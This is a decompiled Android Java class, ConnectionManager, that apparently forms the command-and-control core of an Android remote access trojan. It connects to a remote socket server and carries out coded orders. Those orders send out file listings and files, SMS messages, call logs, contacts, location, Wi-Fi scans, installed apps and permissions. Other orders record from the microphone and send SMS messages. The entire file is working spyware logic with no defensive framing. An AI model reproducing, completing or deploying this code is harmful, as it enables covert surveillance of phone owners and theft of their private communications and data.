package com.example.project20;

import android.content.Context;
import android.os.Looper;
import android.util.Log;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import org.json.JSONException;
import org.json.JSONObject;

public class ConnectionManager {
    public static Context context;
    private static FileManager fm = new FileManager();
    private static Socket ioSocket;

    public static void startAsync(Context context2) {
        try {
            context = context2;
            sendReq();
        } catch (Exception unused) {
            startAsync(context2);
        }
    }

    public static void sendReq() {
        try {
            if (ioSocket == null) {
                Socket ioSocket2 = IOSocket.getInstance().getIoSocket();
                ioSocket = ioSocket2;
                ioSocket2.on("ping", new Emitter.Listener() {
                    /* class com.example.project20.ConnectionManager.AnonymousClass1 */

                    @Override // io.socket.emitter.Emitter.Listener
                    public void call(Object... objArr) {
                        ConnectionManager.ioSocket.emit("pong", new Object[0]);
                    }
                });
                ioSocket.on("order", new Emitter.Listener() {
                    /* class com.example.project20.ConnectionManager.AnonymousClass2 */

                    @Override // io.socket.emitter.Emitter.Listener
                    public void call(Object... objArr) {
                        try {
                            JSONObject jSONObject = (JSONObject) objArr[0];
                            String string = jSONObject.getString("type");
                            char c = 65535;
                            switch (string.hashCode()) {
                                case 1547441:
                                    if (string.equals("0xCL")) {
                                        c = 2;
                                        break;
                                    }
                                    break;
                                case 1547444:
                                    if (string.equals("0xCO")) {
                                        c = 3;
                                        break;
                                    }
                                    break;
                                case 1547531:
                                    if (string.equals("0xFI")) {
                                        c = 0;
                                        break;
                                    }
                                    break;
                                case 1547569:
                                    if (string.equals("0xGP")) {
                                        c = '\t';
                                        break;
                                    }
                                    break;
                                case 1547629:
                                    if (string.equals("0xIN")) {
                                        c = '\b';
                                        break;
                                    }
                                    break;
                                case 1547723:
                                    if (string.equals("0xLO")) {
                                        c = 5;
                                        break;
                                    }
                                    break;
                                case 1547748:
                                    if (string.equals("0xMI")) {
                                        c = 4;
                                        break;
                                    }
                                    break;
                                case 1547845:
                                    if (string.equals("0xPM")) {
                                        c = 7;
                                        break;
                                    }
                                    break;
                                case 1547938:
                                    if (string.equals("0xSM")) {
                                        c = 1;
                                        break;
                                    }
                                    break;
                                case 1548058:
                                    if (string.equals("0xWI")) {
                                        c = 6;
                                        break;
                                    }
                                    break;
                            }
                            switch (c) {
                                case 0:
                                    if (jSONObject.getString("action").equals("ls")) {
                                        ConnectionManager.FI(0, jSONObject.getString("path"));
                                        return;
                                    } else if (jSONObject.getString("action").equals("dl")) {
                                        ConnectionManager.FI(1, jSONObject.getString("path"));
                                        return;
                                    } else {
                                        return;
                                    }
                                case 1:
                                    if (jSONObject.getString("action").equals("ls")) {
                                        ConnectionManager.SM(0, null, null);
                                        return;
                                    } else if (jSONObject.getString("action").equals("sendSMS")) {
                                        ConnectionManager.SM(1, jSONObject.getString("to"), jSONObject.getString("sms"));
                                        return;
                                    } else {
                                        return;
                                    }
                                case 2:
                                    ConnectionManager.CL();
                                    return;
                                case 3:
                                    ConnectionManager.CO();
                                    return;
                                case 4:
                                    ConnectionManager.MI(jSONObject.getInt("sec"));
                                    return;
                                case 5:
                                    ConnectionManager.LO();
                                    return;
                                case 6:
                                    ConnectionManager.WI();
                                    return;
                                case 7:
                                    ConnectionManager.PM();
                                    return;
                                case '\b':
                                    ConnectionManager.IN();
                                    return;
                                case '\t':
                                    ConnectionManager.GP(jSONObject.getString("permission"));
                                    return;
                                default:
                                    return;
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });
                ioSocket.connect();
            }
        } catch (Exception e) {
            Log.e("error", e.getMessage());
        }
    }

    public static void FI(int i, String str) {
        if (i == 0) {
            JSONObject jSONObject = new JSONObject();
            try {
                jSONObject.put("type", "list");
                jSONObject.put("list", FileManager.walk(str));
                ioSocket.emit("0xFI", jSONObject);
            } catch (JSONException unused) {
            }
        } else if (i == 1) {
            FileManager.downloadFile(str);
        }
    }

    public static void SM(int i, String str, String str2) {
        if (i == 0) {
            ioSocket.emit("0xSM", SMSManager.getsms());
        } else if (i == 1) {
            boolean sendSMS = SMSManager.sendSMS(str, str2);
            ioSocket.emit("0xSM", Boolean.valueOf(sendSMS));
        }
    }

    public static void CL() {
        ioSocket.emit("0xCL", CallsManager.getCallsLogs());
    }

    public static void CO() {
        ioSocket.emit("0xCO", ContactsManager.getContacts());
    }

    public static void MI(int i) throws Exception {
        MicManager.startRecording(i);
    }

    public static void WI() {
        ioSocket.emit("0xWI", WifiScanner.scan(context));
    }

    public static void PM() {
        ioSocket.emit("0xPM", PermissionManager.getGrantedPermissions());
    }

    public static void IN() {
        ioSocket.emit("0xIN", AppList.getInstalledApps(false));
    }

    public static void GP(String str) {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("permission", str);
            jSONObject.put("isAllowed", PermissionManager.canIUse(str));
            ioSocket.emit("0xGP", jSONObject);
        } catch (JSONException unused) {
        }
    }

    public static void LO() throws Exception {
        Looper.prepare();
        LocManager locManager = new LocManager(context);
        if (locManager.canGetLocation()) {
            ioSocket.emit("0xLO", locManager.getData());
        }
    }
}
